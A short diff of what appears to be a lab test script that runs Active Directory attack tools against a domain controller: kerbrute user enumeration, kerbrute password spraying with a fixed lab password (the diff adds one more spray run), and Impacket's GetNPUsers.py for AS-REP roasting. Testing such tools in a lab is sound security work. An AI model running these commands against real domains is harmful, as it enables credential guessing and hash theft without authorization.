@@ -34,6 +34,7 @@ kerbrute userenum -d $DOMAIN --dc $DC users.txt | tee kerbrute-userenum.txt > /d
 log "kerbrute passwordspray -d $DOMAIN --dc $DC users.txt Spring-Lab-26 | tee kerbrute-spray.txt"
 kerbrute passwordspray -d $DOMAIN --dc $DC users.txt Spring-Lab-26 | tee kerbrute-spray.txt > /dev/null
 run kerbrute-1.0.3 passwordspray -d $DOMAIN --dc $DC -o kerbrute-o.txt users.txt Spring-Lab-26
+run kerbrute passwordspray -d $DOMAIN --dc $DC -o kerbrute-master-o.txt users.txt Spring-Lab-26 > /dev/null
 
 log "GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC | tee getnpusers.txt"
 GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC | tee getnpusers.txt > /dev/null
